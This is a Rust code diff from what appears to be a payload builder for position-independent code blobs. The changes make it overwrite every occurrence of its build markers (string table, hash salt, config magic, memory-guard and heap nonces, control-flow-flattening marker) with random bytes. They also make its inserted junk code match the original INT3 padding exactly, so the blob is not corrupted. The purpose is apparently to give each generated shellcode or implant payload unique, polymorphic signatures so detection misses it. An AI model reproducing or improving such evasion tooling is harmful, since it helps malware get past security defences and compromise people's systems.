@@ -226,9 +226,9 @@ pub fn finalize_payload(payload: &mut [u8]) {
         fill_random(&mut payload[pos..pos + BUILD_FLAGS_MARKER.len()], &mut rng);
     }
 
-    // Scrub SPECPICBLOB marker if present in the final payload
+    // Scrub ALL occurrences of SPECPICBLOB marker in the final payload
     const PIC_MARKER: &[u8; 12] = b"SPECPICBLOB\x00";
-    if let Some(pos) = find_marker(payload, PIC_MARKER) {
+    while let Some(pos) = find_marker(payload, PIC_MARKER) {
         fill_random(&mut payload[pos..pos + PIC_MARKER.len()], &mut rng);
     }
 }
@@ -397,10 +397,10 @@ fn insert_junk_code(blob: &[u8], density: u8, rng: &mut impl Rng) -> Vec<u8> {
             }
             let run_len = i - run_start;
 
-            // Generate junk of approximately `density` bytes, but at least as
-            // long as the original padding to maintain alignment expectations.
-            let target_len = run_len.max(density);
-            let junk = generate_junk_sequence(target_len, rng);
+            // Generate junk of EXACTLY the same length as the original INT3
+            // padding. Changing the blob size would shift all RIP-relative
+            // references and corrupt the PIC blob.
+            let junk = generate_junk_sequence(run_len, rng);
             out.extend_from_slice(&junk);
         } else {
             out.push(blob[i]);
@@ -544,19 +544,22 @@ pub fn patch_config_magic(blob: &mut [u8], rng: &mut impl Rng) -> Result<u32, Ob
 pub fn scrub_markers(blob: &mut [u8], rng: &mut impl Rng) -> RandomizedMagics {
     let mut config_magic = 0u32;
 
+    // Scrub ALL occurrences of each marker (use while loops — stubs may
+    // have duplicates in .text and .data sections).
+
     // Scrub SPECSTR marker (8 bytes)
-    if let Some(pos) = find_marker(blob, STRING_TABLE_MARKER) {
+    while let Some(pos) = find_marker(blob, STRING_TABLE_MARKER) {
         fill_random(&mut blob[pos..pos + STRING_TABLE_MARKER.len()], rng);
     }
 
     // Scrub SPECHASH marker (8 bytes)
-    if let Some(pos) = find_marker(blob, HASH_SALT_MARKER) {
+    while let Some(pos) = find_marker(blob, HASH_SALT_MARKER) {
         fill_random(&mut blob[pos..pos + HASH_SALT_MARKER.len()], rng);
     }
 
-    // Scrub SPECCFGM marker prefix (8 bytes), preserving the 4-byte magic after it
+    // Scrub SPECCFGM marker prefix (8 bytes), preserving the 4-byte magic after it.
+    // Only read the magic from the FIRST occurrence (the one patched by the builder).
     if let Some(pos) = find_marker(blob, CONFIG_MAGIC_MARKER) {
-        // Read the config magic that was written by patch_config_magic
         let magic_offset = pos + CONFIG_MAGIC_MARKER.len();
         if magic_offset + 4 <= blob.len() {
             config_magic = u32::from_le_bytes([
@@ -568,20 +571,23 @@ pub fn scrub_markers(blob: &mut [u8], rng: &mut impl Rng) -> RandomizedMagics {
         }
         fill_random(&mut blob[pos..pos + CONFIG_MAGIC_MARKER.len()], rng);
     }
+    // Scrub any remaining SPECCFGM occurrences
+    while let Some(pos) = find_marker(blob, CONFIG_MAGIC_MARKER) {
+        fill_random(&mut blob[pos..pos + CONFIG_MAGIC_MARKER.len()], rng);
+    }
 
-    // Scrub SPECMGRD nonce region — replace all 12 bytes with random data.
-    // The builder patches the entire nonce (key changes each cycle anyway).
-    if let Some(pos) = find_marker(blob, MEMGUARD_NONCE_MARKER) {
+    // Scrub SPECMGRD nonce region (12 bytes)
+    while let Some(pos) = find_marker(blob, MEMGUARD_NONCE_MARKER) {
         fill_random(&mut blob[pos..pos + MEMGUARD_NONCE_MARKER.len()], rng);
     }
 
-    // Scrub SPECHEAP nonce region — replace all 12 bytes with random data.
-    if let Some(pos) = find_marker(blob, HEAP_NONCE_MARKER) {
+    // Scrub SPECHEAP nonce region (12 bytes)
+    while let Some(pos) = find_marker(blob, HEAP_NONCE_MARKER) {
         fill_random(&mut blob[pos..pos + HEAP_NONCE_MARKER.len()], rng);
     }
 
     // Scrub SPECFLOW marker (9 bytes)
-    if let Some(pos) = find_marker(blob, CFF_MARKER) {
+    while let Some(pos) = find_marker(blob, CFF_MARKER) {
         fill_random(&mut blob[pos..pos + CFF_MARKER.len()], rng);
     }
 
